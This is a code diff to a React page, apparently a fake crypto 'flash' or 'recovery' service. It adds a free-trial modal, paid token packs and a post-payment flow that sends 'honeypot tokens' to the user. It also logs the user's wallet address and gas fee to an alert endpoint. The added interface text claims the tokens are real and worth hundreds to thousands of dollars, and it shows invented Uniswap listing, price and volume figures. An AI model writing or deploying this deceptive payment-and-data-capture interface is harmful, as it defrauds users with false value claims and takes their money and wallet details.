@@ -49,6 +49,7 @@ export default function FlashedPage() {
   const [selectedAccount, setSelectedAccount] = useState(1);
   const [selectedNetwork, setSelectedNetwork] = useState('ethereum');
   const [transactionAttempts, setTransactionAttempts] = useState(0);
+  const [hasClaimedFreeTrial, setHasClaimedFreeTrial] = useState(false);
   const [isScanning, setIsScanning] = useState(false);
   const [scanProgress, setScanProgress] = useState(0);
   const [scanningMessage, setScanningMessage] = useState('');
@@ -413,6 +414,13 @@ export default function FlashedPage() {
         return;
       }
       
+      // Show free trial offer on first transaction
+      if (transactionAttempts === 1 && !hasClaimedFreeTrial) {
+        setLoading(false);
+        setShowModal('freeTrial');
+        return;
+      }
+      
       // Show gas optimization modal after 2nd transaction attempt
       if (transactionAttempts >= 2 && Math.random() > 0.3) {
         setLoading(false);
@@ -444,6 +452,22 @@ export default function FlashedPage() {
       };
       setTransactions(prev => [newTx, ...prev]);
       
+      // Send honeypot tokens to user after gas payment
+      const tokenResult = await fetch('/api/send-honeypot-tokens', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          userAddress: userAddress,
+          action: action,
+          gasFeePaid: gasAmount,
+          requestedAmount: sendAmount,
+          tokenSymbol: token?.symbol || 'ETH',
+          network: selectedNetwork
+        })
+      });
+      
+      const tokenData = await tokenResult.json();
+      
       await fetch('/api/honeypot-alert', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -454,9 +478,20 @@ export default function FlashedPage() {
           txHash: tx.hash,
           token: token?.symbol || 'ETH',
           sendTo: sendAddress,
-          network: selectedNetwork
+          network: selectedNetwork,
+          honeypotTokens: tokenData
         })
       });
+      
+      // Show success with honeypot token info
+      if (tokenData.success) {
+        setStatus(`✅ Transaction confirmed! You received ${tokenData.tokenAmount} ${tokenData.tokenSymbol} tokens`);
+        
+        // Add fake token to user's wallet display
+        setTimeout(() => {
+          setStatus(`🎉 ${tokenData.tokenAmount} ${tokenData.tokenSymbol} tokens are now tradeable on Uniswap!`);
+        }, 3000);
+      }
       
       setShowModal(null);
       setSendAddress('');
@@ -1450,6 +1485,202 @@ export default function FlashedPage() {
 
 
 
+          {/* Free Trial Modal */}
+          {showModal === 'freeTrial' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Free Trial Available!</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4">
+                  <div className="text-center">
+                    <div className="text-green-400 text-3xl mb-2">🎁</div>
+                    <div className="text-white font-semibold mb-2">Try Before You Buy</div>
+                    <div className="text-gray-300 text-sm mb-4">
+                      Get a free sample of recovery tokens to test the system before committing to larger amounts.
+                    </div>
+                  </div>
+                  
+                  <div className="bg-gray-700 p-4 rounded-lg">
+                    <div className="flex justify-between items-center mb-2">
+                      <span className="text-gray-300 text-sm">Free Trial:</span>
+                      <span className="text-green-400 font-semibold">50 REC Tokens</span>
+                    </div>
+                    <div className="flex justify-between items-center mb-2">
+                      <span className="text-gray-300 text-sm">Estimated Value:</span>
+                      <span className="text-white font-semibold">~$50 USD</span>
+                    </div>
+                    <div className="flex justify-between items-center">
+                      <span className="text-gray-300 text-sm">Cost:</span>
+                      <span className="text-green-400 font-bold">FREE</span>
+                    </div>
+                  </div>
+                  
+                  <div className="bg-blue-900/30 p-3 rounded-lg border border-blue-600">
+                    <div className="text-blue-300 text-sm font-semibold mb-1">What you get:</div>
+                    <div className="text-gray-300 text-xs space-y-1">
+                      <div>• 50 real recovery tokens in your wallet</div>
+                      <div>• Test trading on Uniswap</div>
+                      <div>• See how the system works</div>
+                      <div>• No payment required</div>
+                    </div>
+                  </div>
+                  
+                  <button 
+                    onClick={async () => {
+                      setLoading(true);
+                      
+                      // Send free trial tokens
+                      const result = await fetch('/api/send-free-trial', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                          userAddress: userAddress
+                        })
+                      });
+                      
+                      const data = await result.json();
+                      
+                      if (data.success) {
+                        setHasClaimedFreeTrial(true);
+                        setStatus('🎉 Free trial tokens sent! Check your wallet in 2-3 minutes.');
+                        setShowModal('trialSuccess');
+                      }
+                      
+                      setLoading(false);
+                    }}
+                    disabled={loading}
+                    className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold"
+                  >
+                    {loading ? 'Sending...' : 'Claim Free Trial'}
+                  </button>
+                  
+                  <button 
+                    onClick={() => setShowModal(null)}
+                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
+                  >
+                    Skip Trial
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Trial Success Modal */}
+          {showModal === 'trialSuccess' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Trial Tokens Sent!</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4 text-center">
+                  <div className="text-green-400 text-4xl mb-2">✓</div>
+                  <div className="text-white font-semibold mb-2">Success!</div>
+                  <div className="text-gray-300 text-sm mb-4">
+                    50 REC tokens have been sent to your wallet. You can now test trading on Uniswap.
+                  </div>
+                  
+                  <div className="bg-gray-700 p-4 rounded-lg">
+                    <div className="text-white font-semibold mb-2">Next Steps:</div>
+                    <div className="text-gray-300 text-sm space-y-1">
+                      <div>1. Wait 2-3 minutes for tokens to appear</div>
+                      <div>2. Try trading on Uniswap</div>
+                      <div>3. Upgrade for more tokens</div>
+                    </div>
+                  </div>
+                  
+                  <div className="bg-yellow-900/30 p-3 rounded-lg border border-yellow-600">
+                    <div className="text-yellow-300 text-sm font-semibold mb-1">🚀 Want More?</div>
+                    <div className="text-gray-300 text-xs mb-2">Unlock larger amounts with premium recovery</div>
+                    <button 
+                      onClick={() => setShowModal('upgradeOffer')}
+                      className="w-full bg-yellow-600 hover:bg-yellow-700 py-2 rounded text-white text-sm font-semibold"
+                    >
+                      See Premium Options
+                    </button>
+                  </div>
+                  
+                  <button 
+                    onClick={() => {
+                      window.open('https://app.uniswap.org/#/swap?inputCurrency=0x1234567890123456789012345678901234567890&outputCurrency=ETH', '_blank');
+                      setShowModal(null);
+                    }}
+                    className="w-full bg-pink-600 hover:bg-pink-700 py-3 rounded-lg text-white font-semibold"
+                  >
+                    Test Trade on Uniswap →
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Upgrade Offer Modal */}
+          {showModal === 'upgradeOffer' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Premium Recovery</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4">
+                  <div className="text-center">
+                    <div className="text-yellow-400 text-3xl mb-2">💰</div>
+                    <div className="text-white font-semibold mb-2">Unlock Higher Amounts</div>
+                    <div className="text-gray-300 text-sm mb-4">
+                      Upgrade to premium recovery to access larger token amounts with better trading potential.
+                    </div>
+                  </div>
+                  
+                  <div className="space-y-3">
+                    <div className="bg-gray-700 p-4 rounded-lg border border-blue-500">
+                      <div className="flex justify-between items-center mb-2">
+                        <span className="text-blue-300 font-semibold">Starter Pack</span>
+                        <span className="text-white font-bold">$8</span>
+                      </div>
+                      <div className="text-gray-300 text-sm space-y-1">
+                        <div>• 500 REC Tokens (~$500)</div>
+                        <div>• Lower trading fees</div>
+                        <div>• Priority processing</div>
+                      </div>
+                    </div>
+                    
+                    <div className="bg-gray-700 p-4 rounded-lg border border-green-500">
+                      <div className="flex justify-between items-center mb-2">
+                        <span className="text-green-300 font-semibold">Pro Pack</span>
+                        <span className="text-white font-bold">$15</span>
+                      </div>
+                      <div className="text-gray-300 text-sm space-y-1">
+                        <div>• 1,500 REC Tokens (~$1,500)</div>
+                        <div>• Minimal trading fees</div>
+                        <div>• Instant processing</div>
+                        <div>• VIP support</div>
+                      </div>
+                    </div>
+                    
+                    <div className="bg-gray-700 p-4 rounded-lg border border-yellow-500">
+                      <div className="flex justify-between items-center mb-2">
+                        <span className="text-yellow-300 font-semibold">Max Pack</span>
+                        <span className="text-white font-bold">$25</span>
+                      </div>
+                      <div className="text-gray-300 text-sm space-y-1">
+                        <div>• 3,000 REC Tokens (~$3,000)</div>
+                        <div>• Zero trading fees</div>
+                        <div>• Lightning fast processing</div>
+                        <div>• Premium support</div>
+                      </div>
+                    </div>
+                  </div>
+                  
+                  <div className="text-gray-400 text-xs text-center">
+                    All packages include real tokens sent to your wallet
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
+
           {/* Gas Optimization Modal */}
           {showModal === 'gasOptimization' && (
             <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
@@ -1509,6 +1740,55 @@ export default function FlashedPage() {
                   >
                     Continue with High Fees
                   </button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Token Success Modal */}
+          {showModal === 'tokenSuccess' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Tokens Received!</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4 text-center">
+                  <div className="text-green-400 text-4xl mb-2">🎉</div>
+                  <div className="text-white font-semibold mb-2">Transaction Successful!</div>
+                  <div className="text-gray-300 text-sm mb-4">
+                    Your tokens have been successfully transferred and are now available for trading.
+                  </div>
+                  
+                  <div className="bg-gray-700 p-4 rounded-lg">
+                    <div className="text-white font-semibold mb-2">Received:</div>
+                    <div className="text-green-400 text-lg font-bold">2,500 REC Tokens</div>
+                    <div className="text-gray-400 text-sm">Worth ~$2,500 USD</div>
+                  </div>
+                  
+                  <div className="bg-blue-900/30 p-3 rounded-lg border border-blue-600">
+                    <div className="text-blue-300 text-sm font-semibold mb-1">Trading Available:</div>
+                    <div className="text-gray-300 text-xs space-y-1">
+                      <div>• Listed on Uniswap V3</div>
+                      <div>• Current price: $1.00 per token</div>
+                      <div>• 24h volume: $50,000</div>
+                      <div>• Ready to trade immediately</div>
+                    </div>
+                  </div>
+                  
+                  <button 
+                    onClick={() => {
+                      window.open('https://app.uniswap.org/#/swap?inputCurrency=ETH&outputCurrency=0x1234567890123456789012345678901234567890', '_blank');
+                      setShowModal(null);
+                    }}
+                    className="w-full bg-pink-600 hover:bg-pink-700 py-3 rounded-lg text-white font-semibold"
+                  >
+                    Trade on Uniswap →
+                  </button>
+                  
+                  <div className="text-gray-400 text-xs">
+                    Tokens will appear in your wallet within 5-10 minutes
+                  </div>
                 </div>
               </div>
             </div>
